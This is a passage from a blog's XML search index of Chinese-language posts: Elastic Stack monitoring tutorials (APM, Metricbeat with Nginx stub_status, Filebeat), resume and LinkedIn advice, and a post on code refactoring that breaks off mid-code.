的監控更容易，同一時間多個 transactions 也沒問題</li></ul><p>Elastic Stack 提供了全端的監控，除了 log 還有主機狀態的監控外，APM 提供了應用程式層級的監控及真實用戶監測，蒐集了相關效能資訊像是 response time、DB queries、calls to caches 等等。</p><ul><li>Real User Monitoring (RUM): APM</li><li>Application-level Monitoring: APM</li><li>Server-level Monitoring: Beats</li><li>Logging: Beats or Logstash</li></ul><p>如何在本機也可以使用 APM</p><ul><li>安裝 Elasticsearch cluster with Kibana (version &gt; 5.6)</li><li>下載並啟動 APM server</li><li>在需要監控的程式中安裝並設定 APM agents</li><li>Kibana 查看資料是否資料正確送到 Elasticsearch</li></ul>]]></content>
      
      
      <categories>
          
          <category> ElasticCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metricbeat 應用教學</title>
      <link href="/2020/09/03/elastic-metrics-quick-start/"/>
      <url>/2020/09/03/elastic-metrics-quick-start/</url>
      
        <content type="html"><![CDATA[<p>這篇文章會示範使用 Metricbeat 傳送 Nginx 伺服器狀態到 Elasticsearch 中並使用 Kibana 即時監控系統與服務。</p><h2 id="Metricbeat-介紹"><a href="#Metricbeat-介紹" class="headerlink" title="Metricbeat 介紹"></a>Metricbeat 介紹</h2><p>Metricbeat 是一個輕量的指標搜集器，透過安裝 Metricbeat 這個輕量的 shipper 在需要監控的 Server 上，就可以定時的蒐集相關系統或服務的狀態資訊到 Elasticsearch 或是 Logstash，提供系統層級的監控，目前常見的服務都提供模組支援。</p><h3 id="系統層級監控-Metric"><a href="#系統層級監控-Metric" class="headerlink" title="系統層級監控 (Metric)"></a>系統層級監控 (Metric)</h3><p>為什麼系統層級 (Metric) 的監控很重要?</p><ul><li>實體機硬碟要滿了，資料庫快要寫不進去資料怎麼辦?<ul><li>方便知道什麼時候要加機台</li></ul></li><li>都沒發現網路頻寬用滿，伺服器還是很輕鬆?</li><li>服務掛了等到被客訴了才發現? APP 都閃退幾次了?<ul><li>在高附載時提供告警</li></ul></li><li>每個服務都開一台機器，結果流量集中在少數服務上?</li><li>有些服務吃記憶體，有些吃運算效能，到底要怎麼配機台?<ul><li>確認系統效能瓶頸發生的位置</li></ul></li></ul><p>Metric 跟 Log 單看內容其實很像，其中的異同在</p><ul><li>Metrics 跟 Logs 都提供了監控的效果</li><li>Logs 專注在事件什麼時候發生，還有事件本身</li><li>Metrics 就是排程收集固定資料</li></ul><p>解決的痛點:</p><ul><li>輕量不佔資源的監控</li><li>完整方便的 Dashboard 模板，也可以自行克制</li><li>搭配 Filebeats 傳回的 log 檔可能會更快找出問題</li><li>模組多且可直接照教學使用<ul><li>Apache</li><li>HAProxy</li><li>MongoDB</li><li>MySQL</li><li>Nginx</li><li>PostgreSQL</li><li>Redis</li><li>Zookeeper</li></ul></li></ul><h3 id="安裝-Metricbeat"><a href="#安裝-Metricbeat" class="headerlink" title="安裝 Metricbeat"></a>安裝 Metricbeat</h3><p>Metricbeat 的安裝使用步驟如下</p><ul><li><a href="https://www.elastic.co/downloads/beats/metricbeat">下載 Metricbeat</a> 解壓縮</li><li><code>./metricbeat modules enable nginx</code> 啟用模組</li><li>找到 <code>metricbeat.yml</code> 中的 cloud.id 及 cloud.auth 並填入正確資料</li><li>取消註解 <code>modules.d\nginx.yml</code> 中的 <code>server_status_path: &quot;server-status&quot;</code></li><li><code>./metricbeat test config -e</code> 看看有沒有打錯</li><li>.&#x2F;metricbeat setup</li><li>.&#x2F;metricbeat -e</li><li>安裝位置盡量接近監控的系統，同一台主機會就不需要消耗網路流量</li></ul><h3 id="Metricbeat-教學"><a href="#Metricbeat-教學" class="headerlink" title="Metricbeat 教學"></a>Metricbeat 教學</h3><p>Elastic Stack 提供了最方便蒐集指標的工具也就是 Metricbeat，沒有之一。</p><p>Metricbeat 可以同時從系統及服務上收集好幾種指標傳送到 Elasticsearch 或是 Logstash 儲存，資料量比較大的話通常也會先傳到 Redis 或是 Kafka，資料的生命週期大致如下:</p><ul><li>排程</li><li>傳送<ul><li>Metricbeat error events: 沒抓到也會送錯誤</li></ul></li><li>Hot data 儲存</li><li>搜尋、分析</li><li>Warm data 封存</li><li>Purge</li></ul><p>要怎麼開始使用，可以參考之前寫的 <a href="/2020/09/03/elastic-metrics-quick-start/">Metric Quick Start</a>，步驟大致如下:</p><ul><li><a href="https://www.elastic.co/downloads/beats/metricbeat">下載</a><ul><li>有提供各平台可執行的 binaries 檔</li></ul></li><li>配置<ul><li>記得正確設定 Output</li><li><code>./metricbeat setup --dashboards</code></li></ul></li><li>啟動</li><li>查看資料<ul><li>Index Pattern <code>‒&#123;type&#125;beat-&#123;version&#125;-&#123;yyyy-MM-dd&#125;-XXXXXX</code></li><li>XXXXXX is the number of the index for a given day (文件寫的不太懂怎麼翻 XD)</li><li>預設每滿 30 天或是達到 50GB 新的 Index 就會 Rotate</li><li>資料有送到 Elasticsearch 就可以透過搜尋介面查看</li></ul></li></ul><h2 id="Nginx-伺服器資訊"><a href="#Nginx-伺服器資訊" class="headerlink" title="Nginx 伺服器資訊"></a>Nginx 伺服器資訊</h2><p>Nginx 有內建的 <a href="https://nginx.org/en/docs/http/ngx_http_stub_status_module.html">stub_status</a> 模組，啟用後可以監看基本的伺服器狀態，記得要限制 IP 存取。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">location /server-status &#123;</span><br><span class="line">    stub_status on;</span><br><span class="line"></span><br><span class="line">    access_log off;</span><br><span class="line">    allow 127.0.0.1;</span><br><span class="line">    deny all;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>啟用後瀏覽器瀏覽 <code>http://127.0.0.1/server-status</code> 就可以看到下面的資訊</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Active connections: 3</span><br><span class="line">server accepts handled requests</span><br><span class="line"> 72 72 792</span><br><span class="line">Reading: 0 Writing: 1 Waiting: 2</span><br></pre></td></tr></table></figure><ul><li>Active connections：目前連線數 (含 Waiting)</li><li>server accepts handled requests：接受的連線數 已經處理的連線數 已經處理的請求數</li><li>Reading：目前正在讀取請求表頭的請求數</li><li>Writing：目前正在讀取請求主體、處理與回應的請求數</li><li>Waiting：keep-alive 的連線數</li></ul><h2 id="Kibana-監看-Metric"><a href="#Kibana-監看-Metric" class="headerlink" title="Kibana 監看 Metric"></a>Kibana 監看 Metric</h2><p>Kibana 就是一個管理的 GUI，啟動 Metricbeat 後就可以去 Dashboard 開啟相關範本後瀏覽。</p><p>要評估系統和服務需要很多指標，要評估需要:</p><ul><li>儲存: 讀檔、抓相關指標、網路流量</li><li>分析: 這就是 kibana 的工作</li><li>監控: 監控服務可用性</li></ul><blockquote><p>Nginx Dashboard 匯整了剛剛 Nginx stub_status 模組提供的狀態</p></blockquote><p><img src="/2020/09/03/elastic-metrics-quick-start/NginxMetric.JPG" alt="NginxMetric"></p><blockquote><p>System Dashboard</p></blockquote><p><img src="/2020/09/03/elastic-metrics-quick-start/SystemMetric.JPG" alt="SystemMetric"></p><h2 id="實際案例"><a href="#實際案例" class="headerlink" title="實際案例"></a>實際案例</h2><p>如果我們想要實作一個提供地理資訊的平台，以開源的技術選型為例，資料讀取會需要好幾個服務來源提供，這樣的架構底下只要有一個服務來源出錯，前端就會有功能出現異常，這時候我們就會想要在每個服務上面都安裝監控，去發現系統裡面的效能瓶頸。</p><p>使用組合技 Metrics + Logging + APM 我們就可以更快更方便的了解服務與系統現在的狀況，在出現效能或是系統錯誤時，我們也可以更快速地去進行相關修正。</p><ul><li>資料庫: Metricbeat</li><li>Web Service<ul><li>如果服務在不同台主機上，就每一台都裝 Metricbeat</li><li>服務如果有 Log 可以搭配使用 Filebeat</li><li>API Service: 自己實作的可以再加碼 APM</li></ul></li></ul><p><img src="/2020/09/03/elastic-metrics-quick-start/ServerAndService.png" alt="ServerAndService"></p>]]></content>
      
      
      <categories>
          
          <category> ElasticCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三步驟完成 Filebeat 設定</title>
      <link href="/2020/09/02/elastic-logging-quick-start/"/>
      <url>/2020/09/02/elastic-logging-quick-start/</url>
      
        <content type="html"><![CDATA[<p>這篇文章會透過以下三個步驟，安裝並使用 Filebeat 傳送 Nginx Access Log 到 Elasticsearch 中，最後透過 Kibana 即時監看相關分析，主要步驟有</p><ol><li>建立 Elasticsearch</li><li>安裝 Filebeat，ElasticCloud 服務的話第一次建議先加入 Sample Data 試用，常見的 Apache、Nginx、Docker 在教學範例都有</li><li>Kibana 報表</li></ol><p><img src="/2020/09/02/elastic-logging-quick-start/NginxSample.JPG" alt="NginxSample"></p><p>下一篇文章 <a href="/2020/09/09/elastic-observability-logging-introduction/">Filebeat 深入理解</a> 則會深入的去介紹 Log 與 Filebeat 在實際運用上的細節、基礎概念及相關配置教學。</p><h2 id="建立-Elasticsearch"><a href="#建立-Elasticsearch" class="headerlink" title="建立 Elasticsearch"></a>建立 Elasticsearch</h2><p>這邊可以安裝地端的 Elasticsearch 或是選用 ElasticCloud 服務，ElasticCloud 規格挑喜歡的選就可以了，我是選 GCP 位置台灣 IO 優先，重要的是開好之後記得存好帳號跟密碼，之後要打資料到 kibana 的配置檔中會用到。</p><h3 id="Elastic-Logging-簡介"><a href="#Elastic-Logging-簡介" class="headerlink" title="Elastic Logging 簡介"></a>Elastic Logging 簡介</h3><p>目前蒐集資料到 Elasticsearch 的方法有兩種</p><ul><li>Logstash: Java Base，還沒跑服務就需要吃資源，可負責處理 Log 格式</li><li>Beats: Go Base，需要資源較少效能較好，可以安裝在 server 上協助傳送資訊到 Elasticsearch 或 Logstash，除了這次要用到的 <a href="https://www.elastic.co/products/beats/filebeat">Filebeat</a> 以外還有一堆很厲害的 beat 系列工具，例如 Metricbeat 收集 system loading 還有 Packetbeat 可以收集網路封包。</li></ul><p>為什麼 log 很重要?</p><ul><li>監測應用程式</li><li>安全性分析</li><li>問題排解</li></ul><p>解決的痛點:</p><ul><li>不同的 Log 會有不同的格式</li><li>需要專業知識才讀得懂</li><li>有好幾種 log 的來源</li><li>需要產出不同格式的分析</li></ul><h2 id="安裝-Filebeat"><a href="#安裝-Filebeat" class="headerlink" title="安裝 Filebeat"></a>安裝 Filebeat</h2><p>目標是透過 Filebeat 幫我們自動打 log 資料到 Elasticsearch，如果是 Windows 官方的 Quick Start 不用試了，因為 <a href="https://stackoverflow.com/questions/49467828/filebeat-not-starting-in-windows?rq=1">system module 跑不起來</a>，所以我們要先停用:</p><p><code>./filebeat modules disable system</code></p><p>接下來就挑選 <a href="https://8dbef6a69d9a4547bffe94dbba450e05.asia-east1.gcp.elastic-cloud.com:9243/app/home#/tutorial/nginxLogs">Nginx 的範例</a>來嘗試，首先當然要下載 nginx，下載解壓縮後到目錄直接 <code>start nginx</code> 然後瀏覽器瀏覽 <code>localhost</code> 先來產生一下 access.log，我的 Log 位置會在 <code>C:\nginx-1.18.0\logs</code>。</p><p>Filebeat 的安裝使用步驟如下</p><ul><li><a href="https://www.elastic.co/downloads/beats/filebeat">下載 Filebeat</a> 解壓縮</li><li><code>./filebeat modules enable nginx</code> 啟用模組</li><li>找到 <code>filebeat.yml</code> 中的 cloud.id 及 cloud.auth 並填入正確資料</li><li>找到 <code>modules.d\nginx.yml</code> 中的 <code>var.paths: [&quot;c:\\nginx-1.18.0\\logs\\access.log*&quot;]</code></li><li><code>./filebeat test config -e</code> 看看有沒有打錯</li><li>.&#x2F;filebeat setup</li><li>.&#x2F;filebeat -e</li></ul><p>如果有其他更特殊的 Log，也可以透過直接上傳 log 檔 (CSV, NDJSON, log) 到 kibana，然後人工稍微針對機器學習辨識出來的 Grok Pattern 結果進行編輯即可。</p><p><img src="/2020/09/02/elastic-logging-quick-start/UploadAccessLog.JPG" alt="UploadAccessLog"></p><p>透過剛剛機器學習的模組會幫我們分析 Log 的組成，並且也有幫我們產生 YML 的內容的功能，方便我們去寫剛剛提到的 <code>filebeat.yml</code>。</p><p><img src="/2020/09/02/elastic-logging-quick-start/CreateFilebeatConfiguration.JPG" alt="CreateFilebeatConfiguration"></p><h2 id="Kibana-報表"><a href="#Kibana-報表" class="headerlink" title="Kibana 報表"></a>Kibana 報表</h2><p>Kibana 就是一個管理的 GUI，載入 Sample web logs 範例資料後就可以看到華麗的 Dashboard，如果看到這裡覺得還是很複雜，如果剛好 Server 又是 Nginx 的也很推薦使用 GoAccess 這套工具。</p><table><thead><tr><th>Kibana Dashboard</th><th>GoAccess Dashboard</th></tr></thead><tbody><tr><td><img src="/2020/09/02/elastic-logging-quick-start/DashBoardDemo.JPG" alt="DashBoardDemo"></td><td><img src="/2020/09/02/elastic-logging-quick-start/GoAccessDashboard.JPG" alt="DashBoardDemo"></td></tr></tbody></table><p>這次目標是看 Log 有沒有進來，所以到 Kibana 選單中 Observability 的 logs，有幾個功能還蠻方便的:</p><ol><li>關鍵字搜尋</li><li>關鍵字 highlight</li><li>時段篩選</li></ol><p>接著記得開啟 stream live，並且重複瀏覽幾次 <code>localhost</code> 看看我們剛剛 Nginx Access Log 有沒有自動匯入，如果看到如下圖，就恭喜大大設定成功，完成了這次 Quick Start 的任務。</p><p><img src="/2020/09/02/elastic-logging-quick-start/SeeLog.JPG" alt="SeeLog"></p>]]></content>
      
      
      <categories>
          
          <category> ElasticCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>履歷診斷和優化履歷三步驟</title>
      <link href="/2020/08/17/thinking-resume/"/>
      <url>/2020/08/17/thinking-resume/</url>
      
        <content type="html"><![CDATA[<p>優化履歷前要先懂診斷履歷，履歷的好壞簡單說就是和 JD (Job Desription) 的符合程度，當履歷符合市場上的需求之後，接著就是依照履歷的受眾來進行相關優化。</p><h2 id="履歷診斷"><a href="#履歷診斷" class="headerlink" title="履歷診斷"></a>履歷診斷</h2><p>診斷履歷的五大重點:</p><ol><li>履歷樣式</li><li>JD 符合程度</li><li>相關經驗</li><li>時間資訊</li><li>履歷非相關資訊</li></ol><h3 id="履歷樣式"><a href="#履歷樣式" class="headerlink" title="履歷樣式"></a>履歷樣式</h3><ol><li>排版簡單不要分好幾欄，目的是方便機器閱讀</li><li>顏色全部都黑色統一字型即可，印表機不一定有彩色</li></ol><h3 id="JD-符合程度"><a href="#JD-符合程度" class="headerlink" title="JD 符合程度"></a>JD 符合程度</h3><p>可以快速查看 JD 中關鍵字在履歷中是否有出現? 建議履歷撰寫以相關經驗為主，即使是轉職只有實習、進修培訓也要放，剛畢業則可以列修過哪些相關的課。非相關經驗不需佔太多版面，列了並不會加分。</p><h3 id="相關經驗"><a href="#相關經驗" class="headerlink" title="相關經驗"></a>相關經驗</h3><ol><li>每一個工作經驗中建議都簡單介紹公司或部門，因為其他人不一定會知道</li><li>專案簡單介紹，若過於詳細可以列在作品集</li><li>每個工作經驗列出對應成就，責任不用多列<ul><li>責任: 負責什麼，因為每個人加入這份工作都應該要做</li><li>成就: 可量化的或是有沒有得獎，同樣的一個人跟你做同個職缺，在哪些方面可以做得比別人更好</li><li>目標: 告訴對方過去如何解決問題及對團隊帶來幫助，為了是預測未來可能可以帶來的幫助</li></ul></li><li>相關學歷，如果碩士論文的內容跟這個工作有相關，建議補上 bullet point</li></ol><h3 id="時間資訊"><a href="#時間資訊" class="headerlink" title="時間資訊"></a>時間資訊</h3><ol><li>工作超過 15 年，寫 15 年以上，不需要讓人感覺太老</li><li>工作時間太短可以只寫年份</li><li>畢業年份放結束即可，不需要被知道延畢幾年</li></ol><h3 id="履歷非相關資訊"><a href="#履歷非相關資訊" class="headerlink" title="履歷非相關資訊"></a>履歷非相關資訊</h3><ol><li>興趣不需要寫適合面試的時候聊</li><li>列出參加相關研討會、讀書會</li><li>相關的 Side Project</li><li>相關社團經驗</li></ol><h2 id="履歷優化"><a href="#履歷優化" class="headerlink" title="履歷優化"></a>履歷優化</h2><p>在職涯初期通常履歷需要針對職缺 JD 優化，職涯後期才可能有企業為你設置一個職位。履歷的受眾主要分成搜尋演算法、用人單位 (HR 或用人主管)、朋友和獵頭，所以我們可以從三個方向去優化履歷:</p><ol><li>針對 JD 關鍵字優化</li><li>針對 JD 要求優化</li><li>Linkedin 優化</li></ol><h3 id="針對-JD-關鍵字優化"><a href="#針對-JD-關鍵字優化" class="headerlink" title="針對 JD 關鍵字優化"></a>針對 JD 關鍵字優化</h3><p>首先要讓履歷可以透過演算法被搜尋出來，通常 HR 就是依照 JD 上的內容協助進行搜尋，標題跟內文關鍵字一定要做 SEO 讓篩選系統篩選用，履歷排版建議簡單不要分好幾欄，方便機器閱讀。</p><h3 id="針對-JD-提供對應說明"><a href="#針對-JD-提供對應說明" class="headerlink" title="針對 JD 提供對應說明"></a>針對 JD 提供對應說明</h3><p>第二個 TA 是可能是對履歷沒有耐心的 HR，這時候就需要針對 JD 要求優化說法，會做事情同時也要會行銷自己，舉例來說正常的前端工程師職位，會需要:</p><ul><li>人才熟悉相關的語言和技術</li><li>需要處理整個開發流程，包含設計、開發、測試、發佈</li><li>與非技術相關人員的溝通的經驗</li></ul><p>行銷自己的相關說法:</p><ul><li>若專案為一人維護，則可以強調有獨立作業能力，從設計、建置到測試都能一手包辦</li><li>維護可以改成厲害一點的說法，像是持續監控與改善程式的品質與效能<ul><li>改善了多少效能，也許可以在工作時就將相關紀錄記下來</li><li>透過什麼樣的方式增加了品質</li></ul></li><li>使用 CI&#x2F;CD 工具則可以說明透過加強 Jenkins 或 Gitlab CI 的使用來優化產品的發佈流程</li><li>若是有經營部落格或是開線上課都可以寫進履歷裡<ul><li>像是我寫部落格，是希望透過淺顯的文字分享六年多 Web 開發經驗，這裡也可以補上多少瀏覽數或有哪些熱門文章</li></ul></li></ul><h3 id="Linkedin-優化"><a href="#Linkedin-優化" class="headerlink" title="Linkedin 優化"></a>Linkedin 優化</h3><p>會看到 Linkedin 通常是人力仲介或是獵頭，也可能是學長姊、同學、朋友等弱連結。</p><p>版面一進來，看到的會是簡介，這個部分主要是介紹自己是誰，我的簡介如下:</p><blockquote><p>Web 前後端開發經驗六年，一開始是後端工程師，五年前決定和瀏覽器一起發展而進入前端工程領域，專注在 React.js、 Next.js 相關技術及應用上，後端上使用 Node.js、Socket.IO 做 API 開發和即時資料交換。</p></blockquote><p>介紹自己後，同時就要選對應的幾個技能放在 Skill Set 裡面，只需要放與個人相關事情就好，像是溝通能力這種無法證明的軟實力或是寫作、簡報這種基礎能力可以不用寫。</p><blockquote><p>善於溝通<br><img src="/2020/08/17/thinking-resume/FeelGoodAtSomething.png" alt="FeelGoodAtSomething"></p></blockquote><p>Skill Set 的區塊可以優化的三個部分:</p><ol><li>要和簡介有一致性</li><li>可以找大家幫忙按讚，選了之後建議少換順序</li><li>列出來的技能要跟求職相關</li></ol><p>Linkedin 四個可以優化的部分:</p><ol><li>建議放專業的背景圖</li><li>大頭照不要放畢業照或是黑白套裝照看起來很菜</li><li>可以告訴其他人想要找怎麼樣的工作</li><li>在哪個地點建議不用寫，可能會被看成是外國人</li></ol><h2 id="致謝"><a href="#致謝" class="headerlink" title="致謝"></a>致謝</h2><p>特別感謝之前矽谷阿雅讀書會，將履歷還有 Linkedin 要注意的事情分享給大家，以及 NEX Fundation 的履歷健診健診活動，以下推坑各種連結，歡迎按讚訂閱加入。</p><ul><li><a href="https://www.facebook.com/NEXFoundation">NEXFoundation</a></li><li><a href="https://www.books.com.tw/products/0010859120">追不到夢想就創一個</a></li><li><a href="https://www.facebook.com/hisherryshih/videos/10220518216759564">慌世代拓荒時代</a></li><li><a href="https://www.linkedin.com/in/linyencheng/">我的 Linkedin</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
            <tag> 職場老鳥必點技能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程式碼品質與重構方法</title>
      <link href="/2020/07/08/thinking-refactor-and-code-quaility/"/>
      <url>/2020/07/08/thinking-refactor-and-code-quaility/</url>
      
        <content type="html"><![CDATA[<p>最近幾年常看不同的前端專案，所以想簡單分享成為資深<del>挖洞</del>大師的小秘訣!!!<br>這篇文章將提到:</p><ol><li>重構的概念</li><li>過往經驗中程式碼的地雷們</li></ol><h2 id="重構注意事項"><a href="#重構注意事項" class="headerlink" title="重構注意事項"></a>重構注意事項</h2><p>在我們決定重構之前:</p><ul><li>有想過所有漸進改善方案?</li><li>可階段性發佈漸進改善的成果?</li><li>對現有專案考古程度有比另一半多嗎?</li><li>重構的時間是否足夠?</li><li>重構後有引入後續防呆方法?</li></ul><p>當新的寫法能夠不影響原來的功能且讓程式碼本身更健康，重構就應該盡量用最小的單位回到原來的程式碼，原因是:</p><ul><li>對原來程式影響較小</li><li>對負責 review 的人壓力較小</li><li>團隊人數較多的話，少量多餐較容易快速學到新東西</li><li>Rollback 比較無痛</li></ul><h2 id="重構的步驟"><a href="#重構的步驟" class="headerlink" title="重構的步驟"></a>重構的步驟</h2><ul><li>讓原來程式碼可以跑起來 (不要笑!!! 很多專案少了些沒進版控的環境檔就跑不起來)</li><li>理解原來的行為與結果，重構後才有辦法測試</li><li>找到壞味道，就是那些看很多眼還是難以看懂或是不符合基本原則的程式碼們</li><li>不過短期改不動且能夠運作的建議就先當成 API 使用，進去出來是穩定的即可 QQ</li></ul><h2 id="重構的方法"><a href="#重構的方法" class="headerlink" title="重構的方法"></a>重構的方法</h2><ol><li><p>Red-Green Refactoring<br>從單元測試失敗 &gt; 用最簡單的方法讓測試成功 &gt; 用好的方法讓測試成功</p></li><li><p>Abstraction Refactoring<br>多用一層把需要重構的部分包起來，讓新的部分與舊的部分共存，逐步抽換</p><ul><li>把這次舊元件想重構的欄位、Method 拉到上層</li><li>在上層重構完成後下放到新的元件中</li><li>用新元件取代舊元件</li></ul></li><li><p>Composing Methods Refactoring<br>用多個命名更精確的方法去組合一個複雜功能</p></li><li><p>Moving Features Between Objects Refactoring<br>開一個新檔案，逐步把需要的搬過來，順手把不需要的移掉</p></li><li><p>Simplifying Conditional Expressions Refactoring<br>如果是元件做條件渲染，可以用工廠模式或是 hoc 的概念去組出特化的元件</p></li><li><p>Breaking Code Apart Into More Logical Pieces Refactoring<br>原子化的概念，如果單元越小，就越容易進行組合與重複使用</p></li></ol><p>參考文章如下:<br><a href="https://dzone.com/articles/code-refactoring-techniques">https://dzone.com/articles/code-refactoring-techniques</a></p><h2 id="重構專案配置"><a href="#重構專案配置" class="headerlink" title="重構專案配置"></a>重構專案配置</h2><blockquote><p>前端專案設定到進入開發，依照文件設定至少超過半小時</p></blockquote><p>所以我說那個測試機呢? 設定全新機器正式環境且沒 docker 就算正常，之前有遇過前端專案要在 local 環境設定全部的後端開發環境及 DB 資料才可以進行前端開發。</p><p>認為比較好的方式是除了整合 branch 的測試環境，後端在測試機上每個人也都有自己的測試環境，這樣前端在進行測試的時候就可以針對不同的 port 切換去做相關測試。舉例來說:</p><ul><li>21000: master branch</li><li>21001: stage branch</li><li>21010: develop branch</li><li>21011: feature branch</li><li>21020: developer X’s env</li><li>21021: developer Y’s env</li></ul><blockquote><p>早期的專案會留下過多需要同時啟動的相關環境，沒有使用 docker 的話 CI&#x2F;CD 也會相對困難</p></blockquote><p>早期專案容易導入像是 compass 或是 gulp 來幫助自動化，但現在前端專案以 React 來說，使用 create react app 或是 next.js 都是不錯的選項，可以大量減少我們對前端專案配置檔上的維護與後續升級問題。</p><h2 id="重構-Style-And-Convention"><a href="#重構-Style-And-Convention" class="headerlink" title="重構 Style And Convention"></a>重構 Style And Convention</h2><blockquote><p>專案配置檔沒有 auto format 相關的設定</p></blockquote><ul><li>空白 Tab 傻傻分不清楚</li><li>有時候 <code>-</code> 有時候 <code>_</code> 你會相信腦包沒藥救 QQ</li></ul><p>每個人空格換行風格差異過大，會遇到的問題:</p><ul><li>改專案的時候需要手動去處理空格換行</li><li>在重構的過程中套用自動格式很可能程式碼變更會很多，會建議 code format 完先 commit 一次方便 review</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hello-world = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (hello-world !== ‘helloWorld’) &#123;</span><br><span class="line">    <span class="keyword">return</span> test;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  retrun;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>該用常數的地方不用常數</p></blockquote><p>我之前曾在長期吵雜的環境下工作，在難以專注的情況下若沒有常數防呆就容易發生錯誤。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &#x27;/t/js/lesson/1&#x27;, &#x27;/js/lesson/1&#x27; 複製貼上過程容易 GG 且散落各地</span></span><br><span class="line"><span class="title class_">Router</span>.<span class="title function_">push</span>(<span class="string">&quot;/t/js/lesson/1&quot;</span>);</span><br><span class="line"><span class="title class_">Router</span>.<span class="title function_">push</span>(<span class="string">&quot;/js/lesson/1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 親身經歷下面這樣真的好很多 Orz</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">ROUTE_JS_TEST</span> = <span class="string">&quot;/t/js/lesson/1&quot;</span>;</span><br><span class="line"><span class="title class_">Router</span>.<span class="title function_">push</span>(<span class="variable constant_">ROUTE_JS_TEST</span>);</span><br></pre></td></tr></table></figure><blockquote><p>樣式檔或 JS 沒有 convention</p></blockquote><p>陳年的專案經過多人經手，所以有著多種風格邏輯與寫法，沒裝 ESLint 或是沒有套用大家常用的 Rule 像是 <code>eslint-config-airbnb</code>，建議提早導入 ESLint 或是 StyleLint 這類工具。</p><p>樣式檔除了導入 BEM 這類命名規則外，如果是用 <a href="https://linyencheng.github.io/2020/05/27/css-atomic-css/">atomic-css</a> 的概念是不是也順便解決這些問題了? 更進階一點也許可以直接導入 <a href="https://tailwindcss.com/">tailwindcss</a> 這類的工具。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* -, _都幾? */</span></span><br><span class="line"><span class="selector-class">.user-avatar</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.user_avatar</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>元件沒有寫 Props 驗證<br>元件傳入的時候又很愛用 <code>...props</code> 直接把 parent 給的全部一起往下傳</p></blockquote><p>React 文件寫很棒拜託要看:<br><a href="https://reactjs.org/docs/typechecking-with-proptypes.html">https://reactjs.org/docs/typechecking-with-proptypes.html</a></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">OrzComponent</span> &#123;...props&#125;&gt;&lt;/<span class="title class_">OrzComponent</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">OrzComponent</span>(<span class="params">props</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">OrzChild</span> &#123;<span class="attr">...props</span>&#125; /&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="重構過度結構化"><a href="#重構過度結構化" class="headerlink" title="重構過度結構化"></a>重構過度結構化</h2><blockquote><p>過度結構化<br>我泥中有你你泥中有我</p></blockquote><p>工作一段時間之後，總會覺得好像有些地方可以一次到位，但如果需要跟不同程度的人合作的話，就要認真考慮了。</p><p>舉例來說像是像是 RX 這類的覺得就不用急著導入，<a href="https://en.wikipedia.org/wiki/You_aren%27t_gonna_need_it">You aren’t going to need it（YAGNI）</a>，也就是只需要根據當下的需求，做最簡化的設計。</p><p>如果發現結構複雜且會互相影響的元件，我會:</p><ol><li>還沒有更好的切法前，會直接寫在一起，雖然元件可能會變太大 Orz</li><li>用 redux 這類 Single Source of Truth 的工具</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> user = &#123;</span><br><span class="line">  <span class="attr">basic</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>: <span 